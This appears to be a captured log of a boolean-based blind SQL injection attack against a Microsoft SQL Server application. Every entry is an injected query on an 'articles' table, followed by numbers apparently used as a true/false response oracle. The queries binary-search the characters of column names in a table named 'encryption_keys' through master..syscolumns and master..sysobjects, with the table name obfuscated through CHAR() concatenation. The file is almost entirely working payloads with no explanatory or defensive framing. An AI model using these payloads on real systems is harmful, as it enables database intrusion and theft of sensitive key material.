+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>121	917
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),4,1))>96	916
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),4,1))>48	916
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 0 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),4,1))>1	915
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>64	916
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>96	916
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>112	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>120	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>116	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>118	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),1,1))>117	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>96	916
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>112	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>104	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>100	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>98	916
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),2,1))>97	916
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>96	916
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>112	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>104	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>108	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>106	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),3,1))>107	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),4,1))>96	916
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),4,1))>112	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),4,1))>120	917
+	66
+	138
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),4,1))>116	917
+	66
+	200
+use [master]	86
+	66
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(master..syscolumns.name AS NVARCHAR(4000)),CHAR(32)) FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) AND master..syscolumns.name NOT IN (SELECT TOP 1 master..syscolumns.name FROM master..syscolumns,master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=CHAR(101)+CHAR(110)+CHAR(99)+CHAR(114)+CHAR(121)+CHAR(112)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(95)+CHAR(107)+CHAR(101)+CHAR(121)+CHAR(115) ORDER BY master..syscolumns.name) ORDER BY master..syscolumns.name),4,1))>118	917
+	66
+	138
+use [master]	86
+	66
+	165
